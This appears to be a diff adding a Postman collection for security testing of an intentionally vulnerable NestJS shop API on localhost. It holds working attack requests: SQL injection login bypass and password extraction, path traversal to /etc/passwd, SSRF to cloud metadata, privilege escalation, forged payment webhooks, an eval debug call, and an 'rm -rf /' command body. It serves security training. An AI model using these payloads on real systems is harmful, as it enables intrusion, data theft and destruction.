@@ -1,0 +1,839 @@
+{
+  "info": {
+    "name": "Vulnerable Shop API - Security Testing Collection",
+    "description": "Collection for testing security vulnerabilities in the Vulnerable NestJS Shop application. **WARNING: This collection contains intentional security vulnerabilities for educational purposes only.**",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "version": "1.0.0"
+  },
+  "auth": {
+    "type": "bearer",
+    "bearer": [
+      {
+        "key": "token",
+        "value": "{{jwt_token}}",
+        "type": "string"
+      }
+    ]
+  },
+  "variable": [
+    {
+      "key": "base_url",
+      "value": "http://localhost:3000",
+      "type": "string"
+    },
+    {
+      "key": "jwt_token",
+      "value": "",
+      "type": "string"
+    },
+    {
+      "key": "user_id",
+      "value": "1",
+      "type": "string"
+    }
+  ],
+  "item": [
+    {
+      "name": "01. Authentication (Vulnerable)",
+      "item": [
+        {
+          "name": "Register User",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "if (pm.response.json().token) {",
+                  "    pm.collectionVariables.set('jwt_token', pm.response.json().token);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"test@example.com\",\n  \"username\": \"testuser\",\n  \"password\": \"123456\",\n  \"firstName\": \"Test\",\n  \"lastName\": \"User\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/auth/register",
+              "host": ["{{base_url}}"],
+              "path": ["auth", "register"]
+            },
+            "description": "Register a new user with weak password requirements"
+          }
+        },
+        {
+          "name": "Login User",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "if (pm.response.json().token) {",
+                  "    pm.collectionVariables.set('jwt_token', pm.response.json().token);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"admin@shop.com\",\n  \"password\": \"password123\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/auth/login",
+              "host": ["{{base_url}}"],
+              "path": ["auth", "login"]
+            },
+            "description": "Login with default admin credentials (exposes JWT secret in response)"
+          }
+        },
+        {
+          "name": "SQL Injection in Login",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"admin@shop.com' OR '1'='1' --\",\n  \"password\": \"anything\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/auth/login",
+              "host": ["{{base_url}}"],
+              "path": ["auth", "login"]
+            },
+            "description": "SQL injection bypass in login authentication"
+          }
+        },
+        {
+          "name": "Password Reset (No Verification)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"email\": \"admin@shop.com\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/auth/reset-password",
+              "host": ["{{base_url}}"],
+              "path": ["auth", "reset-password"]
+            },
+            "description": "Reset password without verification (exposes new password in response)"
+          }
+        }
+      ]
+    },
+    {
+      "name": "02. SQL Injection Attacks",
+      "item": [
+        {
+          "name": "Basic SQL Injection - Products Search",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/products/search?q=laptop' OR '1'='1",
+              "host": ["{{base_url}}"],
+              "path": ["products", "search"],
+              "query": [
+                {
+                  "key": "q",
+                  "value": "laptop' OR '1'='1"
+                }
+              ]
+            },
+            "description": "Basic SQL injection to bypass WHERE clause"
+          }
+        },
+        {
+          "name": "Union-based SQL Injection - Extract Users",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/products/search?q=laptop' UNION SELECT id,email,password,username,firstName,lastName FROM users--",
+              "host": ["{{base_url}}"],
+              "path": ["products", "search"],
+              "query": [
+                {
+                  "key": "q",
+                  "value": "laptop' UNION SELECT id,email,password,username,firstName,lastName FROM users--"
+                }
+              ]
+            },
+            "description": "Extract user data including passwords using UNION injection"
+          }
+        },
+        {
+          "name": "SQL Injection in Product ID",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/products/1 OR 1=1",
+              "host": ["{{base_url}}"],
+              "path": ["products", "1 OR 1=1"]
+            },
+            "description": "SQL injection in product ID parameter"
+          }
+        },
+        {
+          "name": "SQL Injection with Database Schema Discovery",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/products/search?q=laptop' UNION SELECT name,type,sql,'',1,2 FROM sqlite_master WHERE type='table'--",
+              "host": ["{{base_url}}"],
+              "path": ["products", "search"],
+              "query": [
+                {
+                  "key": "q",
+                  "value": "laptop' UNION SELECT name,type,sql,'',1,2 FROM sqlite_master WHERE type='table'--"
+                }
+              ]
+            },
+            "description": "Discover database schema using SQLite system tables"
+          }
+        }
+      ]
+    },
+    {
+      "name": "03. Broken Access Control",
+      "item": [
+        {
+          "name": "Access Admin Users (No Auth Required)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/admin/users",
+              "host": ["{{base_url}}"],
+              "path": ["admin", "users"]
+            },
+            "description": "Access admin endpoint without authentication - exposes all user data including passwords"
+          }
+        },
+        {
+          "name": "Delete User (No Auth Required)",
+          "request": {
+            "method": "DELETE",
+            "url": {
+              "raw": "{{base_url}}/admin/users/2?confirm=yes",
+              "host": ["{{base_url}}"],
+              "path": ["admin", "users", "2"],
+              "query": [
+                {
+                  "key": "confirm",
+                  "value": "yes"
+                }
+              ]
+            },
+            "description": "Delete any user without authentication"
+          }
+        },
+        {
+          "name": "Promote User to Admin (No Auth)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"reason\": \"Privilege escalation test\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/admin/promote/2",
+              "host": ["{{base_url}}"],
+              "path": ["admin", "promote", "2"]
+            },
+            "description": "Promote any user to admin without authentication"
+          }
+        },
+        {
+          "name": "Admin Orders with Weak Auth",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "X-Admin-Key",
+                "value": "admin123"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/admin/orders",
+              "host": ["{{base_url}}"],
+              "path": ["admin", "orders"]
+            },
+            "description": "Access all orders with weak header-based authentication"
+          }
+        }
+      ]
+    },
+    {
+      "name": "04. IDOR (Insecure Direct Object References)",
+      "item": [
+        {
+          "name": "Access Any User Profile",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/users/1",
+              "host": ["{{base_url}}"],
+              "path": ["users", "1"]
+            },
+            "description": "Access any user's profile without authentication"
+          }
+        },
+        {
+          "name": "Access Any Order Details",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/orders/1",
+              "host": ["{{base_url}}"],
+              "path": ["orders", "1"]
+            },
+            "description": "Access any order details without authentication"
+          }
+        },
+        {
+          "name": "Update Any User (Authorization Bypass)",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "Authorization",
+                "value": "Bearer {{jwt_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"firstName\": \"Hacked\",\n  \"lastName\": \"User\",\n  \"isAdmin\": true\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/users/1?force=true",
+              "host": ["{{base_url}}"],
+              "path": ["users", "1"],
+              "query": [
+                {
+                  "key": "force",
+                  "value": "true"
+                }
+              ]
+            },
+            "description": "Update any user with force parameter bypass"
+          }
+        },
+        {
+          "name": "Change Any User's Password",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "Authorization",
+                "value": "Bearer {{jwt_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"newPassword\": \"hacked123\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/users/1/password",
+              "host": ["{{base_url}}"],
+              "path": ["users", "1", "password"]
+            },
+            "description": "Change any user's password without current password verification"
+          }
+        }
+      ]
+    },
+    {
+      "name": "05. File Upload Vulnerabilities",
+      "item": [
+        {
+          "name": "Upload Executable File",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "file",
+                  "type": "file",
+                  "src": "malicious.exe",
+                  "description": "Upload executable file (create a test .exe file)"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{base_url}}/upload/product-image",
+              "host": ["{{base_url}}"],
+              "path": ["upload", "product-image"]
+            },
+            "description": "Upload executable file - no file type validation"
+          }
+        },
+        {
+          "name": "Directory Traversal - Access /etc/passwd",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/upload/files/../../../etc/passwd",
+              "host": ["{{base_url}}"],
+              "path": ["upload", "files", "..", "..", "..", "etc", "passwd"]
+            },
+            "description": "Directory traversal to access system files"
+          }
+        },
+        {
+          "name": "SSRF via File Upload from URL",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"url\": \"http://169.254.169.254/latest/meta-data/\",\n  \"filename\": \"metadata.txt\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/upload/from-url",
+              "host": ["{{base_url}}"],
+              "path": ["upload", "from-url"]
+            },
+            "description": "SSRF attack to access cloud metadata service"
+          }
+        },
+        {
+          "name": "Delete Any File",
+          "request": {
+            "method": "POST",
+            "url": {
+              "raw": "{{base_url}}/upload/delete/important-file.txt",
+              "host": ["{{base_url}}"],
+              "path": ["upload", "delete", "important-file.txt"]
+            },
+            "description": "Delete any file without authorization"
+          }
+        }
+      ]
+    },
+    {
+      "name": "06. Information Disclosure",
+      "item": [
+        {
+          "name": "Get All Environment Variables",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/env",
+              "host": ["{{base_url}}"],
+              "path": ["api", "env"]
+            },
+            "description": "Massive information disclosure - all environment variables"
+          }
+        },
+        {
+          "name": "Get Application Secrets",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/secrets?key=secret123",
+              "host": ["{{base_url}}"],
+              "path": ["api", "secrets"],
+              "query": [
+                {
+                  "key": "key",
+                  "value": "secret123"
+                }
+              ]
+            },
+            "description": "Get all application secrets including JWT secret, database credentials"
+          }
+        },
+        {
+          "name": "System Information Disclosure",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/system?level=detailed",
+              "host": ["{{base_url}}"],
+              "path": ["api", "system"],
+              "query": [
+                {
+                  "key": "level",
+                  "value": "detailed"
+                }
+              ]
+            },
+            "description": "Detailed system information including process details and network interfaces"
+          }
+        },
+        {
+          "name": "Configuration with Secrets",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/config?includeSecrets=true",
+              "host": ["{{base_url}}"],
+              "path": ["api", "config"],
+              "query": [
+                {
+                  "key": "includeSecrets",
+                  "value": "true"
+                }
+              ]
+            },
+            "description": "Application configuration including all secrets"
+          }
+        }
+      ]
+    },
+    {
+      "name": "07. Webhook Vulnerabilities",
+      "item": [
+        {
+          "name": "Payment Webhook (No Signature Verification)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Payment-Signature",
+                "value": "fake-signature"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"orderId\": 1,\n  \"amount\": 9999.99,\n  \"status\": \"paid\",\n  \"transactionId\": \"fake-txn-123\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/webhook/payment-notification",
+              "host": ["{{base_url}}"],
+              "path": ["webhook", "payment-notification"]
+            },
+            "description": "Fake payment webhook - no signature verification"
+          }
+        },
+        {
+          "name": "Dangerous Test Webhook",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"action\": \"user_update\",\n  \"target\": \"1\",\n  \"data\": {\n    \"isAdmin\": true,\n    \"firstName\": \"Hacked\"\n  },\n  \"secret\": \"test123\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/webhook/test",
+              "host": ["{{base_url}}"],
+              "path": ["webhook", "test"]
+            },
+            "description": "Test webhook that can execute dangerous actions"
+          }
+        },
+        {
+          "name": "Generic Webhook (Accepts Anything)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"action\": \"system_command\",\n  \"command\": \"rm -rf /\",\n  \"malicious\": true\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/webhook/generic",
+              "host": ["{{base_url}}"],
+              "path": ["webhook", "generic"]
+            },
+            "description": "Generic webhook that processes any data without validation"
+          }
+        }
+      ]
+    },
+    {
+      "name": "08. Order Management Vulnerabilities",
+      "item": [
+        {
+          "name": "Create Order (Price Manipulation)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "Authorization",
+                "value": "Bearer {{jwt_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"items\": [\n    {\n      \"productId\": 1,\n      \"quantity\": 1,\n      \"price\": 0.01\n    }\n  ],\n  \"shippingAddress\": \"123 Hack Street\",\n  \"totalAmount\": 0.01,\n  \"userId\": 1\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/orders",
+              "host": ["{{base_url}}"],
+              "path": ["orders"]
+            },
+            "description": "Create order with manipulated prices - client controls pricing"
+          }
+        },
+        {
+          "name": "Cancel Any Order (No Auth)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"reason\": \"Unauthorized cancellation\"\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/orders/1/cancel",
+              "host": ["{{base_url}}"],
+              "path": ["orders", "1", "cancel"]
+            },
+            "description": "Cancel any order without authentication"
+          }
+        },
+        {
+          "name": "Export All Orders (Weak Secret)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/orders/export/all?secret=export123",
+              "host": ["{{base_url}}"],
+              "path": ["orders", "export", "all"],
+              "query": [
+                {
+                  "key": "secret",
+                  "value": "export123"
+                }
+              ]
+            },
+            "description": "Export all orders with weak secret protection"
+          }
+        },
+        {
+          "name": "Access Other User's Orders",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{jwt_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/orders?userId=1&all=true",
+              "host": ["{{base_url}}"],
+              "path": ["orders"],
+              "query": [
+                {
+                  "key": "userId",
+                  "value": "1"
+                },
+                {
+                  "key": "all",
+                  "value": "true"
+                }
+              ]
+            },
+            "description": "Access any user's orders or all orders with bypass parameter"
+          }
+        }
+      ]
+    },
+    {
+      "name": "09. User Enumeration & Data Exposure",
+      "item": [
+        {
+          "name": "Check Email Exists (User Enumeration)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/users/check/admin@shop.com",
+              "host": ["{{base_url}}"],
+              "path": ["users", "check", "admin@shop.com"]
+            },
+            "description": "Check if email exists - exposes user data for enumeration"
+          }
+        },
+        {
+          "name": "Get All Users (No Auth)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/users",
+              "host": ["{{base_url}}"],
+              "path": ["users"]
+            },
+            "description": "Get all users without authentication"
+          }
+        },
+        {
+          "name": "Export All User Data",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/admin/export/users?secret=export123",
+              "host": ["{{base_url}}"],
+              "path": ["admin", "export", "users"],
+              "query": [
+                {
+                  "key": "secret",
+                  "value": "export123"
+                }
+              ]
+            },
+            "description": "Mass user data export with weak secret"
+          }
+        }
+      ]
+    },
+    {
+      "name": "10. Debug & Configuration Attacks",
+      "item": [
+        {
+          "name": "Debug Endpoint (Code Execution Risk)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"command\": \"eval\",\n  \"args\": [\"process.env\"]\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/api/debug",
+              "host": ["{{base_url}}"],
+              "path": ["api", "debug"]
+            },
+            "description": "Debug endpoint with potential code execution"
+          }
+        },
+        {
+          "name": "Update Configuration (Weak Auth)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Admin-Key",
+                "value": "config123"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"database\": {\n    \"url\": \"file:./hacked.db\"\n  },\n  \"jwt\": {\n    \"secret\": \"hacked-secret\"\n  }\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/api/config/update",
+              "host": ["{{base_url}}"],
+              "path": ["api", "config", "update"]
+            },
+            "description": "Update application configuration with weak authentication"
+          }
+        },
+        {
+          "name": "Health Check (System Info Disclosure)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/health?detailed=true",
+              "host": ["{{base_url}}"],
+              "path": ["api", "health"],
+              "query": [
+                {
+                  "key": "detailed",
+                  "value": "true"
+                }
+              ]
+            },
+            "description": "Detailed health check exposing system information"
+          }
+        }
+      ]
+    }
+  ],
+  "event": [
+    {
+      "listen": "prerequest",
+      "script": {
+        "type": "text/javascript",
+        "exec": [
+          "// Set base URL if not already set",
+          "if (!pm.collectionVariables.get('base_url')) {",
+          "    pm.collectionVariables.set('base_url', 'http://localhost:3000');",
+          "}"
+        ]
+      }
+    }
+  ]
+}
